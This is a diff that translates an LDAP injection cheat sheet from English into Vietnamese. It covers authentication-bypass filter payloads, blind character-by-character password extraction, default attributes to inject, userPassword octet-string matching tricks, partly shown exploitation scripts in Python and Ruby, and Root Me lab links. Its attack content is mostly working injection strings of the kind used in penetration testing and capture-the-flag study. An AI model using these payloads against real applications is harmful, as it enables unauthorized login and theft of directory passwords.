@@ -1,29 +1,31 @@
 # LDAP Injection
 
-> LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
+> LDAP Injection là một cuộc tấn công được sử dụng để khai thác các ứng dụng web xây dựng các câu lệnh LDAP dựa trên input của người dùng. Khi ứng dụng không xử lý và lọc input người dùng đúng cách, attacker có thể sửa đổi các câu lệnh LDAP thông qua một local proxy.
 
-## Summary
+## Tóm tắt
 
-* [Methodology](#methodology)
-    * [Authentication Bypass](#authentication-bypass)
-    * [Blind Exploitation](#blind-exploitation)
-* [Defaults Attributes](#defaults-attributes)
-* [Exploiting userPassword Attribute](#exploiting-userpassword-attribute)
+* [Phương pháp](#methodology)
+
+  * [Vượt qua xác thực](#authentication-bypass)
+  * [Khai thác Blind](#blind-exploitation)
+* [Các Attribute mặc định](#defaults-attributes)
+* [Khai thác Attribute userPassword](#exploiting-userpassword-attribute)
 * [Scripts](#scripts)
-    * [Discover Valid LDAP Fields](#discover-valid-ldap-fields)
-    * [Special Blind LDAP Injection](#special-blind-ldap-injection)
+
+  * [Tìm các LDAP Field hợp lệ](#discover-valid-ldap-fields)
+  * [LDAP Injection Blind đặc biệt](#special-blind-ldap-injection)
 * [Labs](#labs)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Methodology
+## Phương pháp
 
-LDAP Injection is a vulnerability that occurs when user-supplied input is used to construct LDAP queries without proper sanitization or escaping
+LDAP Injection là một lỗ hổng xảy ra khi input do người dùng cung cấp được sử dụng để xây dựng các LDAP query mà không được sanitize hoặc escape đúng cách.
 
-### Authentication Bypass
+### Vượt qua xác thực
 
-Attempt to manipulate the filter logic by injecting always-true conditions.
+Thử thao túng logic của filter bằng cách inject các điều kiện luôn đúng.
 
-**Example 1**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
+**Ví dụ 1**: LDAP query này khai thác các logical operator trong cấu trúc query để có khả năng bypass authentication.
 
 ```sql
 user  = *)(uid=*))(|(uid=*
@@ -31,7 +33,7 @@ pass  = password
 query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
 ```
 
-**Example 2**: This LDAP query exploits logical operators in the query structure to potentially bypass authentication
+**Ví dụ 2**: LDAP query này khai thác các logical operator trong cấu trúc query để có khả năng bypass authentication.
 
 ```sql
 user  = admin)(!(&(1=0
@@ -39,9 +41,9 @@ pass  = q))
 query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
 ```
 
-### Blind Exploitation
+### Khai thác Blind
 
-This scenario demonstrates LDAP blind exploitation using a technique similar to binary search or character-based brute-forcing to discover sensitive information like passwords. It relies on the fact that LDAP filters respond differently to queries based on whether the conditions match or not, without directly revealing the actual password.
+Kịch bản này minh họa LDAP blind exploitation bằng kỹ thuật tương tự binary search hoặc brute-force dựa trên từng ký tự để phát hiện thông tin nhạy cảm như password. Kỹ thuật này dựa trên thực tế rằng LDAP filter phản hồi khác nhau tùy thuộc vào việc điều kiện có khớp hay không, mà không trực tiếp tiết lộ password thực tế.
 
 ```sql
 (&(sn=administrator)(password=*))    : OK
@@ -61,15 +63,15 @@ This scenario demonstrates LDAP blind exploitation using a technique similar to 
 (&(sn=administrator)(password=MYKE)) : OK
 ```
 
-**LDAP Filter Breakdown**:
+**Phân tích LDAP Filter**:
 
-* `&`: Logical AND operator, meaning all conditions inside must be true.
-* `(sn=administrator)`: Matches entries where the sn (surname) attribute is administrator.
-* `(password=X*)`: Matches entries where the password starts with X (case-sensitive). The asterisk (*) is a wildcard, representing any remaining characters.
+* `&`: Logical AND operator, nghĩa là tất cả các điều kiện bên trong đều phải đúng.
+* `(sn=administrator)`: Khớp với các entry có attribute `sn` (surname) là administrator.
+* `(password=X*)`: Khớp với các entry có password bắt đầu bằng X (phân biệt chữ hoa/chữ thường). Dấu sao (*) là wildcard, đại diện cho mọi ký tự còn lại.
 
-## Defaults Attributes
+## Các Attribute mặc định
 
-Can be used in an injection like `*)(ATTRIBUTE_HERE=*`
+Có thể được sử dụng trong injection như `*)(ATTRIBUTE_HERE=*`
 
 ```bash
 userPassword
@@ -83,12 +85,13 @@ givenName
 commonName
 ```
 
-## Exploiting userPassword Attribute
+## Khai thác Attribute userPassword
 
-`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
-In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).
+Attribute `userPassword` không phải là một string giống như attribute `cn`, mà là một OCTET STRING.
 
-> octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.
+Trong LDAP, mọi object, type, operator, v.v. đều được tham chiếu bằng một OID: `octetStringOrderingMatch` (OID 2.5.13.18).
+
+> octetStringOrderingMatch (OID 2.5.13.18): Một matching rule dùng để so sánh theo thứ tự bằng cách thực hiện so sánh từng bit (theo thứ tự big endian) của hai giá trị octet string cho đến khi tìm thấy sự khác biệt. Trường hợp đầu tiên mà một giá trị có bit 0 trong khi giá trị còn lại có bit 1 sẽ khiến giá trị có bit 0 được xem là nhỏ hơn giá trị có bit 1.
 
 ```bash
 userPassword:2.5.13.18:=\xx (\xx is a byte)
@@ -98,7 +101,7 @@ userPassword:2.5.13.18:=\xx\xx\xx
 
 ## Scripts
 
-### Discover Valid LDAP Fields
+### Tìm các LDAP Field hợp lệ
 
 ```python
 #!/usr/bin/python3
@@ -119,7 +122,7 @@ for i in world:
 print(fields)
 ```
 
-### Special Blind LDAP Injection
+### LDAP Injection Blind đặc biệt
 
 ```python
 #!/usr/bin/python3
@@ -137,7 +140,7 @@ for i in range(50):
             break
 ```
 
-Exploitation script by [@noraj](https://github.com/noraj)
+Exploitation script của [@noraj](https://github.com/noraj)
 
 ```ruby
 #!/usr/bin/env ruby
@@ -163,7 +166,7 @@ end
 * [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
 * [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)
 
-## References
+## Tài liệu tham khảo
 
 * [[European Cyber Week] - AdmYSion - Alan Marrec (Maki) - January 14, 2025](https://web.archive.org/web/20250114083154/https://www.maki.bzh/writeups/ecw2018admyssion/)
 * [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://web.archive.org/web/20200924103615/https://0xukn.fr/posts/writeupecw2018admyssion/)
